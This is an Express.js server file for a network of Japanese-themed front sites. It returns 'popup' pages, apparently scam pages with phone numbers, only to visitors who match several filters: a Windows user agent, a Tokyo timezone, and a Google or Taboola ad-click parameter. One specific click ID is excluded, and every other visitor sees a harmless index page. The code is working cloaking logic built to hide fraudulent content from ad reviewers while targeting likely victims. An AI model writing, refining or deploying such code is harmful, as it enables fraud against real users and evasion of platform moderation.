const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 3000;

const firstList = ["yuuyuuyoga", "sakurasuhiandramenbar"];
const secondList = ["hdjavforyou", "javhdaffiliates"];
const thirdList = ["seishinyogajp", "foodhutjapan", "yuyado-onsen", "hotelroyaltonjp"];
const fourthList = ["spadelightjapan"];
const fifthList = [];
const sixthList = ["fitzonefitness", "wanoiyashi", "nogamilearnings", "fitclubcommunity", "expressmealdelivery", "hanasakuniwa"];

// Base domains for allowed origins and referrers
const baseDomains = [
  "sakurasuhiandramenbar.com",
  "foodhutjapan.com",
  "yuyado-onsen.com",
  "hotelroyaltonjp.com",
  "spadelightjapan.fit",
  "javhdaffiliates.site",
  "seishinyogajp.fit",
  "massagesayami.com",
  "yuuyuuyoga.fit",
  "hdjavforyou.online",
  "sakuracoffee.shop",
  "yumimasseuse.shop",
  "hanasakuniwa.shop",
  "fitzonefitness.live",
  "wanoiyashi.shop",
  "nogamilearnings.shop",
  "fitclubcommunity.shop",
  "expressmealdelivery.shop",
  "hanasakuniwa.shop",
];

// Generate all combinations of allowed URLs
const generateAllowedUrls = (domains) => {
  const protocols = ["https://", "http://"];
  const www = ["", "www."];
  const urls = [];
  domains.forEach(domain => {
    protocols.forEach(protocol => {
      www.forEach(prefix => {
        urls.push(`${protocol}${prefix}${domain}`);
      });
    });
  });
  return urls;
};

const allowedUrls = generateAllowedUrls(baseDomains);

// Normalize referer to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// Check if the user's OS is Windows
const isWindowsOS = (userAgent) => userAgent.includes("Windows");

// CORS configuration
const corsOptions = {
  origin: (origin, callback) => {
    if (allowedUrls.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  }
};

// Apply the CORS middleware
app.use(cors(corsOptions));
app.use(express.json());

// List of excluded GCLIDs
const excludedGclids = [
  "Cj0KCQjw-r-vBhC-ARIsAGgUO2C_TQANjVz_anWRFDMLrgWjPRQdR_Jut7w9ET3Vjk5u0k8R6QcOxBkaAgb8EALw_wcB",
];

// Check if the URL contains any of the excluded GCLIDs
const containsExcludedGclid = (url) => excludedGclids.some(gclid => url.includes(gclid));

// Route to handle the POST request
app.post("/", (req, res) => {
  const referer = normalizeReferer(req.headers.referer);
  const userAgent = req.headers["user-agent"];
  const { timezone, fullUrl } = req.body;

  console.log(req.body);
  console.log(`Referer: ${referer}, User-Agent: ${userAgent}`);
  
  const isTokyoTimezone = timezone === "Asia/Tokyo" || timezone === "Etc/GMT-9";
  console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);

  if (isWindowsOS(userAgent) && isTokyoTimezone && !containsExcludedGclid(fullUrl) && (fullUrl?.includes('gclid') || fullUrl?.includes('taboola') || fullUrl?.includes('tx'))) {
    console.log('popupsent');
    if (firstList.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "altmod.html"));
    } else if (secondList.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "secondNumber.html"));
    } else if (thirdList.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "thirdNumber.html"));
    } else if (fourthList.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "fourthNumber.html"));
    } else if (fifthList.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "fifthNumber.html"));
    } else {
      res.sendFile(path.join(__dirname, "sixthNumber.html"));
    }
  } else {
    console.log('popup not sent');
    res.sendFile(path.join(__dirname, "index.html"));
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
